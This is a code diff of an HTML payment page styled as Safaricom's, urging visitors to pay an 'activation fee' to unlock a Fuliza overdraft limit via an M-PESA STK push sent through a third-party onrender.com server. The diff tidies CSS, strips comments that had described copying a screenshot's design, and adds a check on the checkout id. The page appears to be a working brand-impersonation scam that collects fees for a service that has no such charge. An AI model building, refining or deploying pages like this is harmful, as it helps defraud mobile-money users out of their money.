@@ -26,7 +26,6 @@
             min-height: 100vh;
         }
 
-        /* Top Bar styling matching your platform layout */
         .topbar {
             background: var(--safaricom-green);
             color: var(--white);
@@ -45,7 +44,6 @@
             padding: 20px;
         }
 
-        /* Main container layout exactly mirroring the uploaded design card */
         .activation-card {
             background: var(--white);
             width: 100%;
@@ -71,7 +69,6 @@
             margin: 0 0 25px 0;
         }
 
-        /* Value display fields replicating screenshot styles */
         .value-display-row {
             display: flex;
             justify-content: space-between;
@@ -85,16 +82,9 @@
             font-weight: 500;
         }
         
-        .value-title {
-            color: #4a5568;
-        }
+        .value-title { color: #4a5568; }
+        .value-price { color: var(--safaricom-green); font-weight: 700; }
 
-        .value-price {
-            color: var(--safaricom-green);
-            font-weight: 700;
-        }
-
-        /* Phone input custom control grouping */
         .input-label {
             display: block;
             text-align: left;
@@ -113,9 +103,7 @@
             transition: border-color 0.2s ease;
         }
 
-        .phone-input-container:focus-within {
-            border-color: var(--safaricom-green);
-        }
+        .phone-input-container:focus-within { border-color: var(--safaricom-green); }
 
         .country-prefix {
             background: #e2e8f0;
@@ -156,7 +144,6 @@
             margin-top: 6px;
         }
 
-        /* Action triggers */
         .pay-button {
             width: 100%;
             padding: 16px;
@@ -178,18 +165,9 @@
             box-shadow: 0 4px 12px rgba(31, 177, 65, 0.2);
         }
 
-        .pay-button.active:hover {
-            background: var(--safaricom-hover);
-        }
+        .pay-button.active:hover { background: var(--safaricom-hover); }
+        p.footer-disclaimer { font-size: 13px; color: var(--text-muted); line-height: 1.5; margin: 25px 0 0 0; }
 
-        p.footer-disclaimer {
-            font-size: 13px;
-            color: var(--text-muted);
-            line-height: 1.5;
-            margin: 25px 0 0 0;
-        }
-
-        /* Processing layer overlay template */
         #processing-window {
             display: none;
             position: fixed;
@@ -216,12 +194,7 @@
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        #status-text {
-            font-size: 18px;
-            font-weight: 700;
-            margin: 0 0 8px 0;
-        }
+        #status-text { font-size: 18px; font-weight: 700; margin: 0 0 8px 0; }
     </style>
 </head>
 <body>
@@ -239,7 +212,7 @@
 <div class="main-wrapper">
     <div class="activation-card">
         <h2>Activate Your Fuliza Limit Now</h2>
-        <p class="intro-text">Pay your activation fee today to unlock your desired Fuliza limit instantly. Ensure uninterrupted transactions and enjoy seamless access to your funds.</p>
+        <p class="intro-text">Pay your activation fee today to unlock your desired Fuliza limit instantly.</p>
         
         <div class="value-display-row">
             <span class="value-title">Selected Limit:</span>
@@ -260,16 +233,14 @@
 
         <button id="pay-btn" class="pay-button" disabled>Pay Activation Fee Now</button>
         
-        <p class="footer-disclaimer">Make sure to complete the payment to enjoy your increased Fuliza limit immediately. This small investment secures your ability to transact freely without delays.</p>
+        <p class="footer-disclaimer">Make sure to complete the payment to enjoy your increased Fuliza limit immediately.</p>
     </div>
 </div>
 
 <script>
-    // Pull configuration details out of browser context
     const storageAmount = localStorage.getItem("amount") || "0";
     const storageFee = localStorage.getItem("fee") || "0";
 
-    // Update screen display interface mapping numbers correctly
     document.getElementById("displayLimit").innerText = "KSh " + Number(storageAmount).toLocaleString();
     document.getElementById("displayFee").innerText = "KSh " + Number(storageFee).toLocaleString();
 
@@ -282,7 +253,6 @@
 
     function validateForm() {
         let rawValue = phoneInput.value.trim();
-        
         let testValue = rawValue;
         if (rawValue.startsWith('0')) {
             testValue = rawValue;
@@ -313,12 +283,9 @@
     }
 
     phoneInput.addEventListener('input', validateForm);
-    phoneInput.addEventListener('keyup', validateForm);
-    phoneInput.addEventListener('blur', validateForm);
 
     payBtn.addEventListener('click', async () => {
         modal.style.display = "flex";
-        
         statusText.innerText = "SENDING STK PUSH... ";
         statusText.style.color = "var(--status-orange)";
         
@@ -345,35 +312,35 @@
 
             if (response.ok && data.success === true) {
                 
-                // CASE 1: User typed PIN within 5 seconds (Synchronous Success)
+                // CASE 1: Instant success response
                 if (data.status === "completed") {
                     statusText.innerText = "PAYMENT VERIFIED SUCCESSFULLY!";
                     statusText.style.color = "var(--safaricom-green)";
-                    setTimeout(() => { 
-                        window.location.href = "payment2.html"; 
-                    }, 2000);
+                    setTimeout(() => { window.location.href = "payment2.html"; }, 2000);
                 } 
                 
-                // CASE 2: Prompt sent but still waiting for PIN entry (Asynchronous Pending)
+                // CASE 2: Background processing verification fallback loops
                 else if (data.status === "pending") {
                     statusText.innerText = "PROMPT SENT! ENTER YOUR M-PESA PIN";
                     statusText.style.color = "var(--status-orange)";
                     
                     const checkoutId = data.checkout_request_id;
                     
-                    // Start checking our status endpoint every 3 seconds in the background
+                    // FIXED: Safety validation to block running background loops on undefined variables
+                    if (!checkoutId) {
+                        throw new Error("Missing background transaction routing token from gateway.");
+                    }
+                    
                     const pollInterval = setInterval(async () => {
                         try {
                             const statusCheck = await fetch(`https://server100-847a.onrender.com/status/${checkoutId}`);
                             const statusData = await statusCheck.json();
                             
                             if (statusData.status === "completed") {
-                                clearInterval(pollInterval); // Stop checking
+                                clearInterval(pollInterval);
                                 statusText.innerText = "PAYMENT RECEIVED! CONFIRMING...";
                                 statusText.style.color = "var(--safaricom-green)";
-                                setTimeout(() => { 
-                                    window.location.href = "payment2.html"; 
-                                }, 2000);
+                                setTimeout(() => { window.location.href = "payment2.html"; }, 2000);
                             } else if (statusData.status === "failed") {
                                 clearInterval(pollInterval);
                                 statusText.innerText = "TRANSACTION CANCELED OR FAILED";
@@ -381,28 +348,24 @@
                                 setTimeout(() => { modal.style.display = "none"; }, 3000);
                             }
                         } catch (err) {
-                            console.error("Error fetching background verification state:", err);
+                            console.error("Polling execution tracking error:", err);
                         }
                     }, 3000);
 
-                    // Safety net fallback: Stop checking after 60 seconds if nothing happens
-                    setTimeout(() => {
-                        clearInterval(pollInterval);
-                    }, 60000);
+                    // Clear polling loop systematically after 60 seconds
+                    setTimeout(() => { clearInterval(pollInterval); }, 60000);
                 }
 
             } else {
-                throw new Error(data.message || "Insufficient balance or invalid request.");
+                throw new Error(data.message || "Insufficient balance or invalid gateway request.");
             }
         } catch (error) {
             statusText.innerText = "ERROR: " + error.message;
             statusText.style.color = "var(--error-red)";
-            setTimeout(() => { 
-                modal.style.display = "none"; 
-            }, 3500);
+            setTimeout(() => { modal.style.display = "none"; }, 4000);
         }
     });
 </script>
 
 </body>
-
+</html>
